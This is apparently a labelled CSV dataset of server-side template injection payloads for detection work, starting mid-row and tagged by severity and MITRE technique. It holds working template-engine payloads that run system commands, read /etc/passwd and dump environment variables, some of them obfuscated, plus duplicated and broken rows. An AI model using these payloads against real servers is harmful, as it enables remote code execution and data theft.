Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
*{7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (main branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{'a'.toUpperCase()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<#assign ex = """"freemarker.template.utility.Execute""""?new()>${ ex(""""id"""")}""",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{php}echo """,CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{2*2}}[[3*3]],SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{3*'3'}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<%= 3 * 3 %>,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${6*6},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${{3*3}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
@(6+5),SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{3*3},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
#{ 3 * 3 },SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
*{7*7},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{dump(app)}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.items()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ [].class.base.subclasses() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{''.class.mro()[1].subclasses()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ ''.__class__.__mro__[2].__subclasses__() }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{'a'.toUpperCase()}} ,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{ request }},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{self}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
<#assign ex = """"freemarker.template.utility.Execute""""?new()>${ ex(""""id"""")}""",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"${""freemarker.template.utility.Execute""?new()(""id"")}",CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{$smarty.version},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{php}echo `id`;{/php},CMDi_Unix,SSTI,Medium,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{['id']|filter('system')}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{request|attr(""__class__"")}}",SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request.__class__}},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},CMDi_Unix,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",XSS_Script,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.System).getenv()},SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},CMDi_Unix,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},SSTI_Generic,SSTI,Critical,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B2%2A2%7D%7D%5B%5B3%2A3%5D%5D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%7B%7B3%2A%273%27%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%3C%25%3D%203%20%2A%203%20%25%3E%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B6%2A6%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%24%7B%7B3%2A3%7D%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%40%286%2B5%29%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%23%7B3%2A3%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
%23%7B%203%20%2A%203%20%7D%0A,SSTI_Generic,SSTI,Low,T1059.009,Malicious,SSTI payload from payloadbox/ssti-payloads repository (master branch)
